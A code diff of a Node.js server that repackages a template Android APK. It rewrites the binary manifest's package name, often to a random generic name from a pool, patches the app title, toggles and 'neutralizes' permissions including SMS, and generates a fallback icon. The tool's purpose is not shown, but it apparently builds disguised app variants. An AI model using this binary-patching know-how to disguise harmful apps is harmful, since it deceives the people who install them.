@@ -75,7 +75,7 @@ function makeNeutralPerm(originalPerm) {
 
 const OLD_PKG = 'com.asml.tech';
 const PKG_POOL = [
-    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
+    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.smart.hub',
     'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
     'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
     'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
@@ -83,37 +83,160 @@ const PKG_POOL = [
 ];
 
 function resolvePackage(userPkg) {
-    if (!userPkg || !userPkg.trim()) return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
-    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
-    const segments = clean.split('.').filter(s => s.length > 0);
-    // Valid: at least 2 segments, each segment starts with a letter, total length within reason
-    if (segments.length >= 2 && segments.every(s => /^[a-z]/.test(s)) && clean.length >= 5 && clean.length <= 50) {
-        return clean;
+    if (userPkg && userPkg.trim()) {
+        const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
+        const segments = clean.split('.').filter(s => s.length > 0);
+        if (segments.length >= 2 && segments.every(s => /^[a-z][a-z0-9_]*$/.test(s)) && clean.length >= 5 && clean.length <= 50) {
+            return clean;
+        }
     }
     return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
 }
 
-function patchManifestPackageOnly(manifestBuf, newPkg) {
-    const stringCount = manifestBuf.readUInt32LE(16);
-    const stringStart = manifestBuf.readUInt32LE(28);
-    const targetBuf = toUtf16LE(newPkg);
+function replaceStringInAxml(buf, oldStr, newStr) {
+    const fileType = buf.readUInt16LE(0);
+    if (fileType !== 0x0003) throw new Error('Not an AXML file');
 
-    let replaced = false;
+    const spOffset = 8;
+    const spType = buf.readUInt16LE(spOffset);
+    if (spType !== 0x0001) throw new Error('First chunk is not a string pool');
+
+    const spChunkSize = buf.readUInt32LE(spOffset + 4);
+    const stringCount = buf.readUInt32LE(spOffset + 8);
+    const styleCount = buf.readUInt32LE(spOffset + 12);
+    const flags = buf.readUInt32LE(spOffset + 16);
+    const stringsStart = buf.readUInt32LE(spOffset + 20);
+    const stylesStart = buf.readUInt32LE(spOffset + 24);
+    const isUtf8 = (flags & (1 << 8)) !== 0;
+
+    const offsets = [];
     for (let i = 0; i < stringCount; i++) {
-        const offset = manifestBuf.readUInt32LE(36 + i * 4);
-        const absOffset = 8 + stringStart + offset;
-        const len = manifestBuf.readUInt16LE(absOffset);
-        const strOffset = absOffset + 2;
-        const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);
+        offsets.push(buf.readUInt32LE(spOffset + 28 + i * 4));
+    }
 
-        if (str === OLD_PKG) {
-            targetBuf.copy(manifestBuf, strOffset);
-            replaced = true;
-            console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${newPkg}"`);
-            break;
+    const strings = [];
+    let targetIdx = -1;
+    for (let i = 0; i < stringCount; i++) {
+        const absOff = spOffset + stringsStart + offsets[i];
+        if (isUtf8) {
+            let cur = absOff;
+            let charLen = buf[cur++];
+            if (charLen & 0x80) charLen = ((charLen & 0x7f) << 8) | buf[cur++];
+            let byteLen = buf[cur++];
+            if (byteLen & 0x80) byteLen = ((byteLen & 0x7f) << 8) | buf[cur++];
+            const s = buf.toString('utf8', cur, cur + byteLen);
+            strings.push(s);
+            if (s === oldStr && targetIdx === -1) targetIdx = i;
+        } else {
+            let cur = absOff;
+            let charLen = buf.readUInt16LE(cur); cur += 2;
+            if (charLen & 0x8000) {
+                charLen = ((charLen & 0x7fff) << 16) | buf.readUInt16LE(cur); cur += 2;
+            }
+            const s = buf.toString('utf16le', cur, cur + charLen * 2);
+            strings.push(s);
+            if (s === oldStr && targetIdx === -1) targetIdx = i;
         }
     }
-    return replaced;
+
+    if (targetIdx === -1) return buf;
+
+    strings[targetIdx] = newStr;
+
+    const strDataBuffers = [];
+    const newOffsets = [];
+    let currentOffset = 0;
+
+    for (let i = 0; i < stringCount; i++) {
+        newOffsets.push(currentOffset);
+        const s = strings[i];
+        if (isUtf8) {
+            const sBuf = Buffer.from(s, 'utf8');
+            const header = Buffer.alloc(2);
+            header[0] = s.length;
+            header[1] = sBuf.length;
+            const item = Buffer.concat([header, sBuf, Buffer.from([0])]);
+            strDataBuffers.push(item);
+            currentOffset += item.length;
+        } else {
+            const sBuf = Buffer.from(s, 'utf16le');
+            const header = Buffer.alloc(2);
+            header.writeUInt16LE(s.length, 0);
+            const item = Buffer.concat([header, sBuf, Buffer.from([0, 0])]);
+            strDataBuffers.push(item);
+            currentOffset += item.length;
+        }
+    }
+
+    let stringData = Buffer.concat(strDataBuffers);
+    const pad = (4 - (stringData.length % 4)) % 4;
+    if (pad > 0) {
+        stringData = Buffer.concat([stringData, Buffer.alloc(pad)]);
+    }
+
+    let stylesData = Buffer.alloc(0);
+    if (styleCount > 0 && stylesStart > 0) {
+        const stylesAbs = spOffset + stylesStart;
+        const stylesLen = spChunkSize - stylesStart;
+        stylesData = buf.slice(stylesAbs, stylesAbs + stylesLen);
+    }
+
+    const newStringsStart = 28 + stringCount * 4 + styleCount * 4;
+    const newStylesStart = styleCount > 0 ? newStringsStart + stringData.length : 0;
+    const newSpChunkSize = newStringsStart + stringData.length + stylesData.length;
+
+    const newSpHeader = Buffer.alloc(28);
+    newSpHeader.writeUInt16LE(0x0001, 0);
+    newSpHeader.writeUInt16LE(28, 2);
+    newSpHeader.writeUInt32LE(newSpChunkSize, 4);
+    newSpHeader.writeUInt32LE(stringCount, 8);
+    newSpHeader.writeUInt32LE(styleCount, 12);
+    newSpHeader.writeUInt32LE(flags, 16);
+    newSpHeader.writeUInt32LE(newStringsStart, 20);
+    newSpHeader.writeUInt32LE(newStylesStart, 24);
+
+    const offsetTable = Buffer.alloc(stringCount * 4);
+    for (let i = 0; i < stringCount; i++) {
+        offsetTable.writeUInt32LE(newOffsets[i], i * 4);
+    }
+
+    const styleOffsetTable = buf.slice(spOffset + 28 + stringCount * 4, spOffset + 28 + stringCount * 4 + styleCount * 4);
+
+    const newStringPool = Buffer.concat([
+        newSpHeader,
+        offsetTable,
+        styleOffsetTable,
+        stringData,
+        stylesData
+    ]);
+
+    const restOfFile = buf.slice(spOffset + spChunkSize);
+    const newFileSize = 8 + newStringPool.length + restOfFile.length;
+    const newFileHeader = Buffer.alloc(8);
+    newFileHeader.writeUInt16LE(0x0003, 0);
+    newFileHeader.writeUInt16LE(8, 2);
+    newFileHeader.writeUInt32LE(newFileSize, 4);
+
+    return Buffer.concat([newFileHeader, newStringPool, restOfFile]);
+}
+
+async function generateDefaultAppIcon(appName) {
+    const size = 512;
+    const initial = (appName && appName.trim()) ? appName.trim()[0].toUpperCase() : 'A';
+    const svg = `
+    <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#F97316"/>
+          <stop offset="50%" stop-color="#EA580C"/>
+          <stop offset="100%" stop-color="#9A3412"/>
+        </linearGradient>
+      </defs>
+      <rect x="0" y="0" width="${size}" height="${size}" rx="112" fill="url(#grad)"/>
+      <rect x="8" y="8" width="${size - 16}" height="${size - 16}" rx="104" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="8"/>
+      <text x="50%" y="58%" font-family="Arial, Helvetica, sans-serif" font-weight="bold" font-size="260" fill="#ffffff" text-anchor="middle" dominant-baseline="central">${initial}</text>
+    </svg>`;
+    return await sharp(Buffer.from(svg)).png().toBuffer();
 }
 
 const APP_NAME_PH = 'AppTitlePlaceholder_';
@@ -281,10 +404,21 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const arscEntry = zip.getEntry('resources.arsc');
             if (arscEntry) {
                 const arscBuf = arscEntry.getData();
-                const paddedName = fixedLen(targetName, APP_NAME_PH.length);
-                binaryReplaceU8(arscBuf, APP_NAME_PH, paddedName);
-                arscEntry.setData(arscBuf);
-                arscEntry.header.method = 0;
+                const idx = arscBuf.indexOf(APP_NAME_PH);
+                if (idx !== -1) {
+                    const safeTitle = targetName.substring(0, APP_NAME_PH.length);
+                    const len = Buffer.byteLength(safeTitle, 'utf8');
+                    arscBuf[idx - 2] = len;
+                    arscBuf[idx - 1] = len;
+                    Buffer.from(safeTitle, 'utf8').copy(arscBuf, idx);
+                    arscBuf[idx + len] = 0;
+                    for (let i = len + 1; i <= APP_NAME_PH.length; i++) {
+                        arscBuf[idx + i] = 0;
+                    }
+                    arscEntry.setData(arscBuf);
+                    arscEntry.header.method = 0;
+                    console.log(`[PATCH] Title updated: "${safeTitle}" (${len} bytes)`);
+                }
             }
 
             const isSmsEnabled             = enableSmsPermission === 'true';
@@ -302,10 +436,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
             const manifestEntry = zip.getEntry('AndroidManifest.xml');
             if (manifestEntry) {
-                const manifestBuf = manifestEntry.getData();
+                let manifestBuf = manifestEntry.getData();
 
                 if (targetPkg !== OLD_PKG) {
-                    patchManifestPackageOnly(manifestBuf, targetPkg);
+                    manifestBuf = replaceStringInAxml(manifestBuf, OLD_PKG, targetPkg);
+                    console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${targetPkg}"`);
                 }
 
                 const permsToNeutralize = [];
@@ -361,6 +496,16 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (customIcon && customIcon.buffer) {
                 await sendUpdate('apk_progress', { step: 'Embedding launcher icons...', progress: 50 });
                 await replaceIcons(zip, customIcon.buffer);
+            } else {
+                try {
+                    await sendUpdate('apk_progress', { step: 'Generating launcher icons...', progress: 50 });
+                    const fallbackIcon = await generateDefaultAppIcon(targetName);
+                    if (fallbackIcon) {
+                        await replaceIcons(zip, fallbackIcon);
+                    }
+                } catch (iconErr) {
+                    console.error('[ICON] Fallback icon error:', iconErr.message);
+                }
             }
 
             await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
